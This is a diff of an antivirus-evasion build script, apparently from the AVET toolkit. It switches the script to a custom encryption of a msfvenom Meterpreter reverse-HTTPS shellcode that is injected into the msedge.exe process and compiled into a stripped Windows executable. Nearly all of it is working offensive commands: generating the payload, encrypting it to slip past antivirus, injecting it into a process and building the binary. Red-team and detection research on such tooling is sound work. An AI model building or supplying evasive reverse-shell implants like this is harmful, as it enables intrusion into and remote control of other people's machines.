@@ -29,15 +29,14 @@ LHOST=$GLOBAL_LHOST
 # no command preexec
 set_command_source no_data
 set_command_exec no_command
-# generate key file
-generate_key preset aabbcc12de input/key_raw.txt
 # enable debug print
 enable_debug_print
 #CONFIGURATION_END
 
 
 # generate metasploit payload that will later be injected into the target process
-msfvenom -p windows/x64/meterpreter_reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -f raw -a x64 --platform Windows > input/sc_raw.txt
+msfvenom -p windows/x64/meterpreter_reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -f c -a x64 --platform Windows > input/sc_c.txt
+# -> our custom encryption uses takes a C array and output a xor encryption already formatted to be used in C 
 
 # add evasion techniques
 # add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
@@ -45,38 +44,44 @@ msfvenom -p windows/x64/meterpreter_reverse_https lhost=$LHOST lport=$LPORT -e x
 reset_evasion_technique_counter
 
 # encode msfvenom shellcode
-encode_payload xor input/sc_raw.txt input/scenc_raw.txt input/key_raw.txt
+# encode_payload xor input/sc_raw.txt input/scenc_raw.txt input/key_raw.txt
+encode_custom_enc_payload input/sc_c.txt input/scenc_c.txt
+# -> we chose our custom encryption, this will output a an encrypted payload already formatted to be used in C 
+
 
 # array name buf is expected by static_from_file retrieval method
-./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
+# ./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
+# -> we don't need this anymore since our payload is already in the right format
 
 # set shellcode source
 set_payload_source static_from_file input/scenc_c.txt
 
 # convert generated key from raw to C into array "key"
-./tools/data_raw_to_c/data_raw_to_c input/key_raw.txt input/key_c.txt key
+# ./tools/data_raw_to_c/data_raw_to_c input/key_raw.txt input/key_c.txt key
 
 # set key source
-set_key_source static_from_file input/key_c.txt
+set_key_source no_data
+# -> we hardcoded the 'key' so no need to specify a 'key' source
 
 # set payload info source
 set_payload_info_source static_from_here 'msedge.exe'
 
 # set decoder
-set_decoder xor
+set_decoder none
+# -> we directly put the decryptor inside the payload execution method, so no need to specify one here
 
 # set shellcode binding technique
 set_payload_execution_method inject_shellcode_procname
 
 # compile 
-$win64_compiler -o output/injectshc_xor_revhttps_stageless_win64.exe source/avet.c -lws2_32
-strip output/injectshc_xor_revhttps_stageless_win64.exe
+$win64_compiler -o output/injectshc_custom_enc_revhttps_stageless_win64.exe source/avet.c -lws2_32
+strip output/injectshc_custom_enc_revhttps_stageless_win64.exe
 
 # cleanup
 cleanup_techniques
 
 
 echo "
-# Usage example of generated injectshc_xor_revhttps_stageless_win64.exe:
-# $ injectshc_xor_revhttps_stageless_win64.exe
+# Usage example of generated injectshc_custom_enc_revhttps_stageless_win64.exe:
+# $ injectshc_custom_enc_revhttps_stageless_win64.exe
 "
